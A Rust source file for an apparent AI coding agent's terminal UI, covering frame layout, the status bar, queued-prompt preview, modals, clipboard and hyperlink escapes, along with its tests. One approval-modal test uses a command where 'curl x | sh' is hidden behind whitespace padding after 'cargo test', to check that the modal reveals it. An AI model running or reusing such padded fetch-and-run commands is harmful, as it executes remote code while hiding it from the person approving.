//! Frame layout and drawing: the status bar, chat or welcome screen, task panel, queued-prompt
//! preview, modal, and input bands, plus the copy and jump-to-bottom overlays, status-line
//! hyperlinks, and OSC 52 clipboard writes.

use std::io::Write as _;

use anyhow::Result;
use ratatui::Frame;
use ratatui::layout::{Constraint, Layout, Rect};
use ratatui::style::{Modifier, Style};
use ratatui::text::{Line, Span};
use ratatui::widgets::{Block, Paragraph};

use super::App;
use crate::tui::components::status::StatusBar;
use crate::tui::components::welcome::{self, WelcomeSnapshot};
use crate::tui::glyphs::{NEWLINE_GLYPH, USER_PROMPT_PREFIX, USER_PROMPT_PREFIX_WIDTH};
use crate::tui::saturating_u16;
use crate::tui::terminal::{synchronized_update, write_status_hyperlinks};
use crate::tui::theme::Theme;
use crate::util::text::{center_truncate_to_width, truncate_to_width};

/// Chat rows that stay visible however tall the bands below the chat grow.
const MIN_CHAT_HEIGHT: u16 = 1;

/// Maximum queued prompts shown in the preview before collapsing into `+N more`.
const PREVIEW_VISIBLE: usize = 3;

/// Cells a pill's padding takes, one on each side of its label.
const PILL_PADDING: u16 = 2;

/// Narrowest chat that shows the jump-to-bottom pill.
const JUMP_PILL_MIN_WIDTH: u16 = 25;

/// Narrowest chat whose jump-to-bottom pill spells out its label.
const JUMP_LABEL_FULL_MIN_WIDTH: usize = 40;

impl App {
    pub(super) fn render<W: std::io::Write>(
        &mut self,
        terminal: &mut ratatui::Terminal<ratatui::prelude::CrosstermBackend<W>>,
    ) -> Result<()> {
        synchronized_update(terminal, |terminal| {
            terminal.draw(|frame| self.draw_frame(frame))?;
            self.emit_status_hyperlinks(terminal)?;
            self.emit_pending_clipboard(terminal)
        })
    }

    /// Writes a queued OSC 52 copy, which the terminal applies to the system clipboard.
    fn emit_pending_clipboard<W: std::io::Write>(
        &mut self,
        terminal: &mut ratatui::Terminal<ratatui::prelude::CrosstermBackend<W>>,
    ) -> Result<()> {
        if let Some(sequence) = self.pending_clipboard.take() {
            terminal.backend_mut().write_all(sequence.as_bytes())?;
        }
        Ok(())
    }

    /// Replays captured status links as OSC 8 envelopes over the drawn frame.
    fn emit_status_hyperlinks<W: std::io::Write>(
        &mut self,
        terminal: &mut ratatui::Terminal<ratatui::prelude::CrosstermBackend<W>>,
    ) -> Result<()> {
        let links = self.status_bar.take_pending_hyperlinks();
        if !links.is_empty() {
            write_status_hyperlinks(terminal.backend_mut(), &links)?;
        }
        self.status_links = links;
        Ok(())
    }

    pub(super) fn draw_frame(&mut self, frame: &mut Frame<'_>) {
        // The status bar and one chat row stay visible. The modal, or else the input and its
        // popup, outranks the queued-prompt preview, and the preview the task panel.
        let modal_max = frame
            .area()
            .height
            .saturating_sub(StatusBar::HEIGHT + MIN_CHAT_HEIGHT);
        let modal_height = self.modals.height(frame.area().width, modal_max);
        // Modal owns focus, so input and popup bands collapse.
        let modal_active = self.modals.is_active();
        let popup_height = if modal_active {
            0
        } else {
            self.input.popup_height()
        };
        let input_height = if modal_active { 0 } else { self.input.height() };
        let spare = modal_max.saturating_sub(modal_height + popup_height + input_height);
        let preview_height = self.preview_height().min(spare);
        let tasks_height = self.tasks.height().min(spare - preview_height);
        // Pre-fill with surface bg so unpainted gaps inherit the theme.
        frame.render_widget(Block::default().style(self.theme.surface()), frame.area());
        let [status, chat, tasks, preview, modal, popup, input] = Layout::vertical([
            Constraint::Length(StatusBar::HEIGHT),
            Constraint::Min(MIN_CHAT_HEIGHT),
            Constraint::Length(tasks_height),
            Constraint::Length(preview_height),
            Constraint::Length(modal_height),
            Constraint::Length(popup_height),
            Constraint::Length(input_height),
        ])
        .areas(frame.area());

        self.status_bar
            .set_queued_prompts(self.pending_prompts.len());
        self.status_bar.set_task_progress(self.tasks.progress());
        self.status_bar
            .set_session_id(&self.session_info.session_id);
        self.status_bar
            .set_theme_name(&self.session_info.config.theme_name);
        self.status_bar
            .set_permission_mode(self.session_info.config.permission_mode);
        self.status_bar.render(frame, status);
        if self.chat.is_empty() && self.session_info.config.show_welcome {
            let snap = WelcomeSnapshot::from_live(&self.session_info);
            welcome::paint(frame, chat, &self.theme, &snap);
        } else {
            self.chat.render(frame, chat);
            let jump = self.jump_pill(chat);
            let jump_width = jump.as_ref().map_or(0, |(pill, _)| pill.width);
            self.render_copy_notice(frame, chat, jump_width);
            if let Some((pill, line)) = jump {
                frame.render_widget(Paragraph::new(line).style(self.theme.surface()), pill);
            }
        }
        if tasks_height > 0 {
            self.tasks.render(frame, tasks, &self.theme);
        }
        if preview_height > 0 {
            self.render_preview(frame, preview);
        }
        if modal_active {
            self.modals.render(frame, modal, &self.theme);
        } else {
            if popup_height > 0 {
                self.input.render_popup(frame, popup);
            }
            self.input.render(frame, input);
        }
    }

    fn preview_height(&self) -> u16 {
        if self.pending_prompts.is_empty() {
            return 0;
        }
        let visible = self.pending_prompts.len().min(PREVIEW_VISIBLE);
        let overflow = usize::from(self.pending_prompts.len() > PREVIEW_VISIBLE);
        saturating_u16(visible + overflow)
    }

    fn render_preview(&self, frame: &mut Frame<'_>, area: Rect) {
        let body_width = usize::from(area.width)
            .saturating_sub(usize::from(USER_PROMPT_PREFIX_WIDTH))
            .saturating_sub(1);

        let mut lines: Vec<Line<'static>> = Vec::with_capacity(PREVIEW_VISIBLE + 1);
        for prompt in self.pending_prompts.iter().take(PREVIEW_VISIBLE) {
            lines.push(preview_line(prompt, &self.theme, body_width));
        }
        if self.pending_prompts.len() > PREVIEW_VISIBLE {
            let extra = self.pending_prompts.len() - PREVIEW_VISIBLE;
            let gutter = " ".repeat(usize::from(USER_PROMPT_PREFIX_WIDTH));
            lines.push(Line::from(Span::styled(
                format!("{gutter}+{extra} more"),
                self.theme.dim(),
            )));
        }
        frame.render_widget(Paragraph::new(lines).style(self.theme.surface()), area);
    }

    /// Shows the outcome of the last copy at the chat's bottom-left corner, in the width the
    /// jump-to-bottom pill of `jump_width` cells leaves, keeping a cell between them.
    fn render_copy_notice(&self, frame: &mut Frame<'_>, area: Rect, jump_width: u16) {
        let Some(notice) = &self.copy_notice else {
            return;
        };
        let room = match jump_width {
            0 => area.width,
            width => area.width.saturating_sub(width + 1),
        };
        if area.height == 0 || room <= PILL_PADDING {
            return;
        }
        let label = truncate_to_width(&notice.text, usize::from(room - PILL_PADDING));
        let style = if notice.failed {
            self.theme.warning()
        } else {
            self.theme.success()
        };
        let line = pill_line(label, style);
        let width = saturating_u16(line.width()).min(room);
        frame.render_widget(
            Paragraph::new(line).style(self.theme.surface()),
            bottom_row(area, area.x, width),
        );
    }

    /// The jump-to-bottom pill at the chat's bottom-right corner while scrolled up.
    fn jump_pill(&self, area: Rect) -> Option<(Rect, Line<'static>)> {
        if !self.chat.is_scrolled_up() || area.width < JUMP_PILL_MIN_WIDTH || area.height == 0 {
            return None;
        }

        let new_count = self.chat.new_content_since_pause();
        let label = jump_overlay_label(new_count, usize::from(area.width));
        let style = if new_count == 0 {
            self.theme.dim()
        } else {
            self.theme.accent()
        };
        let line = pill_line(label, style);
        let width = saturating_u16(line.width());
        if width > area.width {
            return None;
        }
        Some((bottom_row(area, area.right() - width, width), line))
    }
}

/// `label` in `style`, padded by a cell on each side.
fn pill_line(label: String, style: Style) -> Line<'static> {
    Line::from(vec![
        Span::raw(" "),
        Span::styled(label, style),
        Span::raw(" "),
    ])
}

/// The `width` cells from column `x` on the bottom row of a non-empty `area`.
fn bottom_row(area: Rect, x: u16, width: u16) -> Rect {
    Rect {
        x,
        y: area.bottom() - 1,
        width,
        height: 1,
    }
}

fn jump_overlay_label(new_count: u32, width: usize) -> String {
    if width < JUMP_LABEL_FULL_MIN_WIDTH {
        return "↓ (ctrl+End)".to_owned();
    }
    let label = match new_count {
        0 => "Jump to bottom (ctrl+End) ↓".to_owned(),
        1 => "1 new message (ctrl+End) ↓".to_owned(),
        n => format!("{n} new messages (ctrl+End) ↓"),
    };
    center_truncate_to_width(&label, width.saturating_sub(usize::from(PILL_PADDING)))
}

/// Renders a queued prompt as a dim ghost, capped at `body_width` columns.
fn preview_line(prompt: &str, theme: &Theme, body_width: usize) -> Line<'static> {
    let flat = prompt.replace('\n', NEWLINE_GLYPH);
    let display = truncate_to_width(&flat, body_width);
    let style = theme.queued().add_modifier(Modifier::DIM);
    Line::from(vec![
        Span::styled(USER_PROMPT_PREFIX, style),
        Span::styled(display, style),
    ])
}

#[cfg(test)]
mod tests {
    use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
    use indoc::indoc;
    use ratatui::Terminal;
    use ratatui::backend::TestBackend;
    use ratatui::style::Color;
    use tokio::sync::mpsc;

    use super::*;
    use crate::config::StatusLineSegment;
    use crate::permission::{Basis, Mode};
    use crate::protocol::{Decision, Event, Op, ToolCall, ToolResult};
    use crate::tool::tasks::testing::plan;
    use crate::tool::{ApprovalBody, ApprovalPreview, ToolResultView};
    use crate::tui::action::Action;
    use crate::tui::app::CopyNotice;
    use crate::tui::app::testing::{
        FakeModal, crossterm_test_terminal, five_hour_limit, long_chat_block,
        push_answerable_approval, render_app, rendered_text, test_app,
    };
    use crate::tui::components::status::StatusBar;
    use crate::tui::components::status::testing::status_bar_init;
    use crate::tui::git_probes::GitUpdate;
    use crate::tui::testing::{buffer_rows, key_event};

    // ── render ──

    const BEGIN_SYNC: &[u8] = b"\x1b[?2026h";
    const END_SYNC: &[u8] = b"\x1b[?2026l";

    fn index_of(haystack: &[u8], needle: &[u8]) -> Option<usize> {
        haystack.windows(needle.len()).position(|w| w == needle)
    }

    #[test]
    fn render_brackets_frame_with_sync_update_bytes() {
        let (mut app, _rx, _event_tx) = test_app(None);
        let (mut terminal, buf) = crossterm_test_terminal(60, 8);

        app.render(&mut terminal).unwrap();

        let bytes = buf.lock().unwrap();
        let begin = index_of(&bytes, BEGIN_SYNC).expect("BeginSynchronizedUpdate emitted");
        let end = index_of(&bytes, END_SYNC).expect("EndSynchronizedUpdate emitted");
        assert!(begin < end, "sync update must bracket the rendered frame");
    }

    #[test]
    fn render_replays_status_hyperlinks_inside_the_synchronized_update() {
        let (mut app, _rx, _event_tx) = test_app(None);
        app.apply_git_update(GitUpdate::PullRequest(Some(
            crate::util::git::PullRequest {
                number: 7,
                url: "https://example.com/pull/7".to_owned(),
                checks: None,
                review: None,
            },
        )));
        let (mut terminal, buf) = crossterm_test_terminal(120, 8);

        app.render(&mut terminal).unwrap();

        let bytes = buf.lock().unwrap();
        let link = index_of(&bytes, b"\x1b]8;;https://example.com/pull/7").expect("OSC 8 emitted");
        let end = index_of(&bytes, END_SYNC).expect("EndSynchronizedUpdate emitted");
        assert!(link < end, "sync update must bracket the status links");
    }

    #[test]
    fn render_writes_a_queued_clipboard_copy_once_inside_the_synchronized_update() {
        let (mut app, _rx, _event_tx) = test_app(None);
        let (mut terminal, buf) = crossterm_test_terminal(60, 8);
        app.pending_clipboard = Some("\x1b]52;c;eA==\x07".to_owned());

        app.render(&mut terminal).unwrap();
        let first = std::mem::take(&mut *buf.lock().unwrap());
        app.render(&mut terminal).unwrap();

        let copy = index_of(&first, b"\x1b]52;c;eA==\x07").expect("OSC 52 written");
        let end = index_of(&first, END_SYNC).expect("EndSynchronizedUpdate emitted");
        assert!(copy < end, "sync update must bracket the copy");
        assert_eq!(
            index_of(&buf.lock().unwrap(), b"\x1b]52"),
            None,
            "written once"
        );
    }

    #[test]
    fn render_repaints_when_chat_content_grows_past_viewport() {
        use std::fmt::Write as _;

        // Content pushed in the same handler tick must land before a post-paint re-clamp.
        let (mut app, _rx, _event_tx) = test_app(None);
        let mut body = String::new();
        for i in 0..40 {
            _ = writeln!(body, "line {i:02} of a long system block");
        }
        app.chat.push_system_message(body);
        let text = rendered_text(&mut app, 60, 12);
        assert!(
            text.contains("line 39"),
            "tail of overflowing block must be in the viewport after the first render, \
             got:\n{text}",
        );
    }

    // ── emit_status_hyperlinks ──

    #[test]
    fn emit_status_hyperlinks_is_a_noop_when_no_links_pending() {
        let (mut app, _rx, _event_tx) = test_app(None);
        let (mut terminal, bytes) = crossterm_test_terminal(80, 24);
        app.emit_status_hyperlinks(&mut terminal).unwrap();
        assert!(
            bytes.lock().unwrap().is_empty(),
            "no bytes written for a no-link frame",
        );
    }

    // ── draw_frame ──

    #[test]
    fn draw_frame_lays_out_status_chat_and_input_in_order() {
        let (mut app, _rx, _event_tx) = test_app(Some("Session title"));
        insta::assert_snapshot!(render_app(&mut app, 80, 10));
    }

    #[test]
    fn draw_frame_shows_rate_limits_and_app_state_in_opt_in_segments() {
        let (mut app, _rx, _event_tx) = test_app(None);
        app.status_bar = StatusBar::new(
            &app.theme,
            status_bar_init(vec![
                StatusLineSegment::QueuedPrompts,
                StatusLineSegment::FiveHourLimit,
                StatusLineSegment::SessionId,
                StatusLineSegment::Theme,
            ]),
        );
        app.pending_prompts.push_back("next".to_owned());

        app.handle_engine_event(Event::RateLimitsUpdated(five_hour_limit()));

        let text = rendered_text(&mut app, 100, 12);
        let status = text.lines().next().unwrap();
        assert_eq!(
            status.trim_end(),
            "  Queued: 1 │ 5h: 42% │ ID: test-ses │ Theme: mocha"
        );
    }

    /// Pushes a finished `ls` call listing two files.
    fn push_ls_call(app: &mut App) {
        app.chat.push_tool_call(ToolCall {
            id: "t1".to_owned(),
            name: "bash".to_owned(),
            input: serde_json::json!({"command": "ls"}),
            icon: "$".to_owned(),
            label: "ls".to_owned(),
        });
        app.chat.push_tool_result(ToolResult {
            id: "t1".to_owned(),
            content: "README.md\nCargo.toml".to_owned(),
            is_error: false,
            title: Some("ran ls".to_owned()),
            view: ToolResultView::Text {
                content: "README.md\nCargo.toml".to_owned(),
            },
        });
    }

    #[test]
    fn draw_frame_with_conversation_and_tool_call() {
        let (mut app, _rx, _event_tx) = test_app(None);
        app.chat
            .push_user_message("what files are here?".to_owned());
        push_ls_call(&mut app);
        app.chat.append_stream_token("Two files.");
        app.chat.commit_streaming();
        insta::assert_snapshot!(render_app(&mut app, 60, 12));
    }

    #[test]
    fn draw_frame_streaming_shows_spinner_in_status_bar() {
        let (mut app, _rx, _event_tx) = test_app(None);
        app.dispatch_action(Action::Submit("working...".to_owned()));
        app.handle_engine_event(Event::StreamToken("part".to_owned()));
        insta::assert_snapshot!(render_app(&mut app, 60, 8));
    }

    const COMPACT_SUMMARY: &str = indoc! {"
        ## Recap

        - Fixed the token refresh in the login flow.
        - Next: add a regression test.
    "};

    /// An app running `/compact` on a short exchange, its summary streamed to the last bullet.
    fn app_streaming_a_summary() -> (App, mpsc::Receiver<Op>, mpsc::UnboundedSender<Event>) {
        let (mut app, rx, event_tx) = test_app(None);
        app.chat.push_user_message("Fix the login bug.".to_owned());
        app.chat.append_stream_token("Fixed the token refresh.");
        app.chat.commit_streaming();
        app.dispatch_action(Action::Submit("/compact".to_owned()));
        let streamed = &COMPACT_SUMMARY[..COMPACT_SUMMARY.find("- Next").unwrap()];
        app.handle_engine_event(Event::SummaryToken(streamed.to_owned()));
        (app, rx, event_tx)
    }

    #[test]
    fn draw_frame_compaction_streams_the_summary_below_the_chat() {
        let (mut app, _rx, _event_tx) = app_streaming_a_summary();
        insta::assert_snapshot!(render_app(&mut app, 60, 16));
    }

    #[test]
    fn draw_frame_compaction_success_leaves_only_the_compacted_summary() {
        let (mut app, _rx, _event_tx) = app_streaming_a_summary();
        app.handle_engine_event(Event::SessionCompacted {
            summary: COMPACT_SUMMARY.trim().to_owned(),
            pre_count: 3,
            instructions: None,
            automatic: false,
        });
        app.handle_engine_event(Event::SessionReady);
        insta::assert_snapshot!(render_app(&mut app, 60, 16));
    }

    #[test]
    fn draw_frame_compaction_cancel_drops_the_partial_summary() {
        let (mut app, _rx, _event_tx) = app_streaming_a_summary();
        app.handle_engine_event(Event::SummaryDiscarded);
        app.handle_engine_event(Event::Cancelled);
        insta::assert_snapshot!(render_app(&mut app, 60, 16));
    }

    #[test]
    fn draw_frame_compaction_failure_drops_the_partial_summary_and_shows_the_error() {
        let (mut app, _rx, _event_tx) = app_streaming_a_summary();
        app.handle_engine_event(Event::SummaryDiscarded);
        app.handle_engine_event(Event::TurnFailed(
            "Compaction failed: the summary hit the max_tokens output limit before it finished"
                .to_owned(),
        ));

        let text = rendered_text(&mut app, 60, 16);
        assert!(
            text.contains("Compaction failed: the summary hit the max_tokens"),
            "{text}"
        );
        assert!(!text.contains("Summarizing"), "{text}");
        assert!(!text.contains("Recap"), "{text}");
        assert!(text.contains("Fixed the token refresh."), "{text}");
    }

    #[test]
    fn draw_frame_shows_the_copy_notice_in_the_chat_bottom_left_corner() {
        let (mut app, _rx, _event_tx) = test_app(None);
        app.chat.push_system_message("hello");

        for (text, failed, fg) in [
            ("Copied 5 characters", false, app.theme.success.fg),
            (
                "Not copied: no clipboard is reachable",
                true,
                app.theme.warning.fg,
            ),
        ] {
            app.copy_notice = Some(CopyNotice {
                text: text.to_owned(),
                failed,
                until: std::time::Instant::now(),
            });
            let backend = render_app(&mut app, 60, 10);

            let buffer = backend.buffer();
            let rows = buffer_rows(buffer);
            let y = rows
                .iter()
                .position(|row| row.contains(text))
                .expect("notice shown");
            assert!(rows[y].starts_with(&format!(" {text} ")), "{rows:?}");
            assert!(rows[y + 1].starts_with('─'), "the last chat row: {rows:?}");
            assert_eq!(buffer[(1, u16::try_from(y).unwrap())].fg, fg.unwrap());
        }
    }

    #[test]
    fn draw_frame_truncates_the_copy_notice_left_of_the_jump_pill() {
        let (mut app, _rx, _event_tx) = test_app(None);
        app.chat.push_system_message(long_chat_block());
        _ = render_app(&mut app, 60, 10);
        app.chat
            .handle_event(&key_event(KeyCode::PageUp, KeyModifiers::NONE));
        app.copy_notice = Some(CopyNotice {
            text: "Not copied: Terminal.app ignores OSC 52. Fn-drag to select.".to_owned(),
            failed: true,
            until: std::time::Instant::now(),
        });

        let text = rendered_text(&mut app, 60, 10);

        let row = text
            .lines()
            .find(|row| row.contains("Jump to bottom"))
            .expect("pill shown");
        let pill = row.find(" Jump to bottom").unwrap();
        assert!(row.starts_with(" Not copied: Terminal"), "{row}");
        assert!(row[..pill].trim_end().ends_with("..."), "{row}");
    }

    #[test]
    fn draw_frame_auto_scroll_on_hides_jump_overlay() {
        let (mut app, _rx, _event_tx) = test_app(None);
        app.chat.push_system_message(long_chat_block());

        let text = rendered_text(&mut app, 60, 10);
        assert!(!text.contains("Jump to bottom"), "{text}");
    }

    #[test]
    fn draw_frame_scrolled_up_shows_jump_overlay() {
        let (mut app, _rx, _event_tx) = test_app(None);
        app.chat.push_system_message(long_chat_block());
        _ = render_app(&mut app, 60, 10);

        app.chat
            .handle_event(&key_event(KeyCode::PageUp, KeyModifiers::NONE));
        let text = rendered_text(&mut app, 60, 10);

        assert!(text.contains("Jump to bottom"), "{text}");
    }

    #[test]
    fn draw_frame_scrolled_up_counts_new_content() {
        let (mut app, _rx, _event_tx) = test_app(None);
        app.chat.push_system_message(long_chat_block());
        _ = render_app(&mut app, 60, 10);
        app.chat
            .handle_event(&key_event(KeyCode::PageUp, KeyModifiers::NONE));

        app.chat.push_error("background update");
        let text = rendered_text(&mut app, 60, 10);

        assert!(text.contains("1 new message"), "{text}");
    }

    #[test]
    fn draw_frame_narrow_width_still_renders_all_three_panels() {
        let (mut app, _rx, _event_tx) = test_app(Some("narrow"));
        app.chat.push_user_message("hi".to_owned());
        insta::assert_snapshot!(render_app(&mut app, 40, 8));
    }

    #[test]
    fn draw_frame_renders_slash_popup_above_input_when_visible() {
        let (mut app, _rx, _event_tx) = test_app(None);
        app.handle_crossterm_event(&key_event(KeyCode::Char('/'), KeyModifiers::NONE));
        assert!(app.input.popup_visible());

        let text = rendered_text(&mut app, 60, 14);
        assert!(
            text.contains("/archive"),
            "popup must paint at least one canonical command row: {text}",
        );
    }

    #[test]
    fn draw_frame_preview_panel_renders_queued_prompts_and_overflow_tag() {
        let (mut app, _rx, _event_tx) = test_app(None);
        app.dispatch_action(Action::Submit("active".to_owned()));
        for i in 0..5 {
            app.pending_prompts.push_back(format!("queued {i}"));
        }
        insta::assert_snapshot!(render_app(&mut app, 60, 14));
    }

    #[test]
    fn draw_frame_task_panel_sits_above_the_preview_and_feeds_the_status_progress() {
        let (mut app, _rx, _event_tx) = test_app(None);
        app.status_bar = StatusBar::new(
            &app.theme,
            status_bar_init(vec![
                StatusLineSegment::Model,
                StatusLineSegment::TaskProgress,
            ]),
        );
        app.dispatch_action(Action::Submit("active".to_owned()));
        push_ls_call(&mut app);
        app.pending_prompts.push_back("queued 0".to_owned());

        app.handle_engine_event(Event::TasksUpdated(plan()));

        insta::assert_snapshot!(render_app(&mut app, 60, 14));
    }

    #[test]
    fn draw_frame_gives_the_input_its_rows_before_the_task_panel() {
        let (mut app, _rx, _event_tx) = test_app(None);
        app.input.set_text("one\ntwo\nthree\nfour\nfive");
        app.handle_engine_event(Event::TasksUpdated(plan()));

        let text = rendered_text(&mut app, 40, 12);
        let rows: Vec<&str> = text.lines().map(str::trim_end).collect();

        assert_eq!(
            rows[3..5],
            ["  ● Add the entry type", "  +1 pending, 1 completed"]
        );
        assert_eq!(rows[5], "─".repeat(40));
        assert!(rows[6].ends_with("one"), "{text}");
    }

    #[test]
    fn draw_frame_hides_input_and_popup_while_modal_active() {
        // Modal owns focus, so the layout must collapse the input + popup bands. The user-prompt
        // marker (`❯`) is the cheapest substring proof that the input got rendered.
        let (mut app, _rx, _event_tx) = test_app(None);
        let baseline = rendered_text(&mut app, 60, 14);
        assert!(
            baseline.contains(USER_PROMPT_PREFIX),
            "input prompt marker must paint without a modal: {baseline}",
        );

        app.modals
            .push(Box::new(FakeModal::new("FAKE-MODAL-TITLE")));
        let with_modal = rendered_text(&mut app, 60, 14);
        assert!(
            with_modal.contains("FAKE-MODAL-TITLE"),
            "modal body must render: {with_modal}",
        );
        assert!(
            !with_modal.contains(USER_PROMPT_PREFIX),
            "input must collapse while modal is active: {with_modal}",
        );

        // A non-cancel key still reaches the modal, so collapsing the layout keeps its focus grab.
        let action = app.modals.handle_key(&KeyEvent::from(KeyCode::Char('x')));
        assert!(action.is_none(), "FakeModal consumes without emitting");
        assert!(app.modals.is_active(), "Consumed must not pop the stack");
    }

    #[test]
    fn draw_frame_sizes_a_modal_before_the_queued_prompt_preview() {
        let (mut app, mut rx, _event_tx) = test_app(None);
        for i in 0..5 {
            app.pending_prompts.push_back(format!("queued {i}"));
        }
        push_answerable_approval(&mut app, "cargo test --all");

        let text = rendered_text(&mut app, 60, 11);
        assert!(text.contains("cargo test --all"), "{text}");

        app.handle_crossterm_event(&key_event(KeyCode::Char('y'), KeyModifiers::NONE));
        let forwarded = rx.try_recv().expect("approval forwarded");
        assert!(matches!(
            forwarded,
            Op::Resolve {
                decision: Decision::Approve,
                ..
            }
        ));
    }

    #[test]
    fn draw_frame_approval_modal_wraps_and_reveals_a_padded_command() {
        let (mut app, _rx, _event_tx) = test_app(None);
        app.push_approval_modal(
            "call-1".to_owned(),
            ApprovalPreview {
                title: "Bash".to_owned(),
                body: ApprovalBody::Command(format!("cargo test{}; curl x | sh", " ".repeat(80))),
            },
            &Basis::Mode(Mode::Manual),
            None,
        );
        insta::assert_snapshot!(render_app(&mut app, 60, 14));
    }

    #[test]
    fn draw_frame_surface_fill_overwrites_unpainted_cells_with_surface_bg() {
        let (mut app, _rx, _event_tx) = test_app(None);
        let sentinel = Color::Rgb(254, 0, 254);
        let surface_bg = app.theme.surface().bg.expect("surface slot defines bg");

        let mut terminal = Terminal::new(TestBackend::new(60, 10)).unwrap();
        for cell in &mut terminal.current_buffer_mut().content {
            cell.set_bg(sentinel);
        }
        terminal.draw(|frame| app.draw_frame(frame)).unwrap();

        let buffer = terminal.backend().buffer();
        for y in 0..10 {
            for x in 0..60 {
                let cell = buffer.cell((x, y)).expect("cell in bounds");
                assert_eq!(
                    cell.bg, surface_bg,
                    "cell ({x},{y}) kept the sentinel, surface fill regressed",
                );
            }
        }
    }

    // ── preview_height ──

    #[test]
    fn preview_height_is_zero_when_queue_empty() {
        let (app, _rx, _event_tx) = test_app(None);
        assert_eq!(app.preview_height(), 0);
    }

    #[test]
    fn preview_height_caps_at_visible_plus_overflow_row() {
        let (mut app, _rx, _event_tx) = test_app(None);
        for i in 0..(PREVIEW_VISIBLE + 5) {
            app.pending_prompts.push_back(format!("p{i}"));
        }
        assert_eq!(
            app.preview_height(),
            u16::try_from(PREVIEW_VISIBLE + 1).unwrap(),
        );
    }

    // ── render_preview ──

    #[test]
    fn render_preview_overflow_appends_more_count_row() {
        let (mut app, _rx, _event_tx) = test_app(None);
        app.input.set_enabled(false);
        let extra = 3;
        for i in 0..(PREVIEW_VISIBLE + extra) {
            app.pending_prompts.push_back(format!("queued-{i}"));
        }

        let text = rendered_text(&mut app, 60, 20);
        assert!(
            text.contains(&format!("+{extra} more")),
            "overflow hint must show exact extra count: {text}",
        );
    }

    // ── jump_pill ──

    #[test]
    fn jump_pill_sits_in_the_bottom_right_corner_of_a_wide_enough_chat() {
        let (mut app, _rx, _event_tx) = test_app(None);
        app.chat.push_system_message(long_chat_block());
        _ = render_app(&mut app, 60, 10);
        app.chat
            .handle_event(&key_event(KeyCode::PageUp, KeyModifiers::NONE));
        let area = Rect::new(2, 1, JUMP_PILL_MIN_WIDTH, 5);

        let narrow = app.jump_pill(Rect {
            width: JUMP_PILL_MIN_WIDTH - 1,
            ..area
        });
        let (pill, line) = app.jump_pill(area).expect("pill shown");

        assert_eq!(narrow, None);
        assert_eq!(line.to_string(), " ↓ (ctrl+End) ");
        assert_eq!(pill, Rect::new(13, 5, 14, 1));
    }

    // ── jump_overlay_label ──

    #[test]
    fn jump_overlay_label_idle_reads_jump_to_bottom() {
        assert_eq!(jump_overlay_label(0, 60), "Jump to bottom (ctrl+End) ↓");
    }

    #[test]
    fn jump_overlay_label_pluralizes_new_message_count() {
        assert_eq!(jump_overlay_label(1, 60), "1 new message (ctrl+End) ↓");
        assert_eq!(jump_overlay_label(3, 60), "3 new messages (ctrl+End) ↓");
    }

    #[test]
    fn jump_overlay_label_uses_short_form_below_full_width() {
        assert_eq!(
            jump_overlay_label(3, JUMP_LABEL_FULL_MIN_WIDTH - 1),
            "↓ (ctrl+End)"
        );
        assert_eq!(
            jump_overlay_label(3, JUMP_LABEL_FULL_MIN_WIDTH),
            "3 new messages (ctrl+End) ↓"
        );
    }
}
